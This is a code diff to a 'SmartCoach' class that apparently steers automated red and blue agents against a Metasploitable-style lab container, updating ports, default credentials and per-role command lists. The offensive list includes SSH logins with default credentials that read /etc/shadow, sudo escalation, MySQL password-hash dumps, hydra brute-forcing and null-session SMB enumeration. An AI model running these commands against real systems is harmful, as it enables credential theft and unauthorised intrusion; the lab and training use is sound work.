@@ -343,6 +343,12 @@ class SmartCoach:
         
         logger.info(f"SmartCoach initialized for {agent_name} | Role: {self.agent_role['role']} | {self.agent_role['description']}")
 
+        # ─── PHASE 7.4: Tool availability check (one-time at init) ───────────
+        # Cache which tool binaries exist on the system so we don't waste
+        # steps on commands for tools that aren't installed.
+        self._unavailable_tools: set = set()
+        self._check_tool_availability()
+
         # ─── PHASE 6.6: Difficulty preset (set externally by orchestrator) ───
         self.difficulty_preset = None  # Set via set_difficulty_preset()
 
@@ -778,10 +784,12 @@ class SmartCoach:
         # Target-aware port and credential defaults
         is_ms3 = ctx.target in ("172.28.0.11",) or getattr(ctx, 'difficulty', '') == 'medium'
         if is_ms3:
-            target_ports = "21,22,80,139,445,3306,6667,8080,8484,9200"
-            default_user = "vagrant"
-            default_pass = "vagrant"
-            default_rport = "8080"
+            # Phase 7.3: VERIFIED — only these ports are open on the real MS3 Docker
+            target_ports = "21,22,111,139,445,3306"
+            # Phase 7.3: VERIFIED — msfadmin:msfadmin works, vagrant does NOT
+            default_user = "msfadmin"
+            default_pass = "msfadmin"
+            default_rport = "22"
         else:
             target_ports = "21,22,23,25,80,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6667,8180"
             default_user = "msfadmin"
@@ -1144,8 +1152,11 @@ class SmartCoach:
             if mentor_engagement.engage:
                 should_call_gpt = True
                 gpt_reason = f"{mentor_engagement.trigger.value}:{mentor_engagement.reason}"
-                # Reset stagnation on mentor call
-                self._stagnation_steps = 0
+                # Phase 7.3: Do NOT reset stagnation on mentor call — only reset on
+                # actual discoveries (record_result). This prevents the stagnation→mentor→
+                # reset→stagnation cycle where mentor fires every 4 steps but nothing
+                # actually advances.
+                # self._stagnation_steps = 0  # REMOVED — reset only on real progress
         else:
             # Fallback: legacy 3-condition gating (Phase 6.1 compat)
             stagnation_steps = getattr(self, '_stagnation_steps', 0)
@@ -1672,64 +1683,69 @@ class SmartCoach:
         
         alternative_commands = {
             "recon": [
-                f"nmap -sV -p 21,22,23,25,80,139,445,1524,3306,5432,5900,6667,8180 {target}",
-                f"nmap -sC -p 512,513,514,1099,2049,3632,6697,8009,8787 {target}",
-                f"nmap --script vuln -p 21,139,445,6667 {target}",
-                f"nmap -sU -p 69,111,161,2049 {target}",
-                f"rpcinfo -p {target}",
+                f"nmap -sV -p 21,22,111,139,445,3306 {target}",
+                f"nmap -sC -p 21,22,111,139,445,3306 {target}",
+                f"nmap --script vuln -p 21,22,139,445 {target}",
+                f"nmap -sV --version-intensity 5 -p 21,22,111,139,445,3306 {target}",
+                f"nmap -A -p 21,22 {target}",
+                f"nmap --script smb-vuln* -p 139,445 {target}",
+                f"nmap --script ftp-anon,ftp-bounce -p 21 {target}",
+                f"enum4linux -a {target}",
+                f"smbclient -L //{target} -N",
+                f"dig @{target} ANY",
                 f"showmount -e {target}",
                 f"finger @{target}",
-                f"smtp-user-enum -M VRFY -U /tmp/users.txt -t {target}",
-                f"masscan -p{(step*100+rand_offset)%65535}-{(step*100+1000+rand_offset)%65535} {target}",
-                f"dig {target} TXT +short",
-                f"whatweb -v http://{target}",
-                f"nbtscan {target}",
             ],
             "offensive": [
-                f"searchsploit kernel {5 + step % 10}.{rand_offset % 5}",
-                f"nikto -h http://{target} -C all -Tuning {step % 10}",
-                f"nuclei -u http://{target} -severity critical,high -t cves/",
-                f"hydra -l user{step} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
-                f"sqlmap -u 'http://{target}/page?id={step}' --batch --random-agent",
-                f"commix -u 'http://{target}/cmd?exec=id' --batch",
-                f"ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://{target}/page?file=FUZZ",
-                f"wpscan --url http://{target} --plugins-detection aggressive",
-                f"curl -s http://{target}:8180/manager/html",
-                f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'id; cat /etc/shadow'",
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'sudo -S id <<< msfadmin'",
+                f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
+                f"mysql -h {target} -u root -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
+                f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
+                f"hydra -l msfadmin -p msfadmin ssh://{target} -t 4",
+                f"enum4linux -a {target}",
+                f"rpcclient -U '' -N {target} -c 'enumdomusers'",
+                f"smbclient //{target}/tmp -N -c 'ls'",
+                f"searchsploit proftpd 1.3.5",
+                f"searchsploit samba 3.0",
             ],
             "stealth": [
-                f"nc -zv {target} 1524 2>&1",
-                f"nc -zv {target} 6667 2>&1",
-                f"nc -zv {target} 1099 2>&1",
-                f"nc -zv {target} 512 2>&1",
-                f"nc -zv {target} 5900 2>&1",
-                f"curl -s http://{target}:8180/manager/html 2>&1 | head -5",
-                f"smbclient -L //{target} -N 2>/dev/null | head -10",
-                f"snmpwalk -v2c -c public {target} system 2>/dev/null | head -10",
-                f"psql -h {target} -U postgres -c '\\l' 2>/dev/null",
+                f"nc -zv {target} 21 2>&1",
+                f"nc -zv {target} 22 2>&1",
+                f"nc -zv {target} 139 2>&1",
+                f"nc -zv {target} 445 2>&1",
+                f"nc -zv {target} 3306 2>&1",
+                f"nc -zv {target} 111 2>&1",
+                f"smbclient -L //{target} -N 2>/dev/null",
+                f"rpcclient -U '' -N {target} -c 'srvinfo'",
                 f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
+                f"enum4linux -a {target} 2>/dev/null",
             ],
             "strategic": [
-                f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/big.txt -t {5 + step} -x php,html",
-                f"ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://{target}/FUZZ -mc 200,301,302",
-                f"dirsearch -u http://{target} -e php,html,js,txt -t {10 + step}",
-                f"gospider -s http://{target} -d 2 -c 5",
-                f"katana -u http://{target} -d 2 -jc",
-                f"arjun -u http://{target}/page -m GET",
+                f"nmap -sV -O -p 21,22,111,139,445,3306 {target}",
+                f"nmap --script smb-enum-shares -p 139,445 {target}",
+                f"nmap --script mysql-info -p 3306 {target}",
+                f"enum4linux -a {target}",
+                f"smbclient -L //{target} -N",
+                f"rpcclient -U '' -N {target} -c 'enumdomusers'",
             ],
             "defensive": [
-                f"ss -tlnp | grep LISTEN | head -{10 + step}",
-                f"ps aux --sort=-%cpu | head -{10 + step}",
+                f"ss -tlnp 2>/dev/null",
+                f"ps aux --sort=-%cpu 2>/dev/null",
                 f"last -n {5 + step*2}",
-                f"netstat -tulpn 2>/dev/null | head -{15 + step}",
-                f"lsof -i -P -n | head -{20 + step}",
-                f"iptables -L -n -v | head -30",
+                f"netstat -tulpn 2>/dev/null",
+                f"lsof -i -P -n 2>/dev/null",
+                f"iptables -L -n -v 2>/dev/null",
             ],
         }
         
         alts = alternative_commands.get(role_name, alternative_commands["recon"])
+        # Phase 7.5: Filter alternatives for tool availability
+        _ut = getattr(self, '_unavailable_tools', set())
+        if _ut:
+            alts = [cmd for cmd in alts
+                    if cmd.strip().split()[0].lower() not in _ut]
         used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
         available = [cmd for cmd in alts if self._extract_tool_prefix(cmd) not in used_prefixes]
         if not available:
@@ -1805,6 +1821,10 @@ class SmartCoach:
             if cmd.name in self.step_used_commands:
                 continue
             
+            # Phase 7.4: Skip commands for tools not installed on this system
+            if not self._is_tool_available(cmd):
+                continue
+            
             # Prioritize preferred commands
             if cmd.name in preferred_names:
                 filtered.insert(0, cmd)  # Add to front
@@ -1822,6 +1842,54 @@ class SmartCoach:
                 filtered.append(cmd)
         
         return filtered
+    
+    # ── Phase 7.4: Tool availability filter ──────────────────────────────
+    
+    # Tools known to NOT be standard Linux utilities and likely missing.
+    # We check these with shutil.which() once at init.
+    _TOOL_BINARIES = {
+        "crackmapexec", "impacket-psexec", "impacket-secretsdump",
+        "impacket-smbexec", "smbmap", "dirsearch", "dnsrecon",
+        "wpscan", "commix", "chisel", "windapsearch", "enum4linux-ng",
+        "rpcinfo", "gospider", "feroxbuster", "gobuster",
+        "masscan", "whatweb", "smbclient", "rpcclient",
+        "nuclei", "ffuf", "nikto", "sqlmap", "hydra",
+        "nmap", "msfconsole", "msfvenom", "searchsploit",
+        "enum4linux", "ftp", "telnet", "sshpass", "psql", "mysql",
+        "curl", "nc", "dig",
+    }
+    
+    def _check_tool_availability(self) -> None:
+        """One-time check: which tool binaries are installed on this system."""
+        import shutil
+        unavailable = set()
+        for tool in self._TOOL_BINARIES:
+            if not shutil.which(tool):
+                unavailable.add(tool)
+        self._unavailable_tools = unavailable
+        if unavailable and self.agent_name == "RedAgent":
+            # Only log once (from Red's perspective) to avoid 5× spam
+            logger.info(
+                f"[TOOL-CHECK] {len(unavailable)} unavailable tools filtered: "
+                f"{', '.join(sorted(unavailable)[:10])}{'...' if len(unavailable) > 10 else ''}"
+            )
+    
+    def _is_tool_available(self, cmd: "CommandTemplate") -> bool:
+        """Check if the base tool for a command is installed."""
+        if not self._unavailable_tools:
+            return True
+        # Extract the first word (tool binary) from the template
+        template = cmd.template.strip()
+        # Handle leading { echo or other wrappers
+        if template.startswith("{"):
+            # Multi-command block — usually fine (uses echo/telnet/etc.)
+            return True
+        if template.startswith("for ") or template.startswith("while "):
+            return True
+        first_word = template.split()[0] if template else ""
+        # Strip path prefixes (e.g., /usr/bin/nmap → nmap)
+        base_tool = first_word.rsplit("/", 1)[-1]
+        return base_tool not in self._unavailable_tools
     
     def _get_blue_agent_command(self, ctx: AttackContext) -> SmartDecisionResult:
         """
@@ -2876,6 +2944,36 @@ class SmartCoach:
                     if tpl and mask[idx]:
                         cmd_tool = tpl.template.split()[0].lower() if tpl.template else ""
                         if cmd_tool in _ft:
+                            mask[idx] = False
+
+            # Phase 7.5: Block commands whose tool is NOT INSTALLED on host
+            _ut = getattr(self, '_unavailable_tools', set())
+            if _ut:
+                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
+                    if tpl and mask[idx]:
+                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
+                        # Strip path prefixes and shell variables
+                        if "/" in cmd_tool:
+                            cmd_tool = cmd_tool.rsplit("/", 1)[-1]
+                        if cmd_tool in _ut:
+                            mask[idx] = False
+
+            # Phase 7.5: Block HTTP-targeting commands when port 80 is closed
+            _discovered = ctx.discoveries.get("open_port", set()) if ctx.discoveries else set()
+            _flags = ctx.state_flags if ctx.state_flags else {}
+            _has_http = ("80" in _discovered or "8080" in _discovered
+                         or _flags.get("http_found", False))
+            if not _has_http:
+                _HTTP_TOOLS = {"gobuster", "feroxbuster", "dirsearch", "nikto",
+                               "ffuf", "whatweb", "wpscan", "sqlmap", "commix",
+                               "dirb", "wfuzz", "gospider", "katana", "arjun"}
+                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
+                    if tpl and mask[idx]:
+                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
+                        if cmd_tool in _HTTP_TOOLS:
+                            mask[idx] = False
+                        # Also catch commands with http:// in template
+                        elif tpl.template and "http://" in tpl.template.lower():
                             mask[idx] = False
 
             if not mask.any():
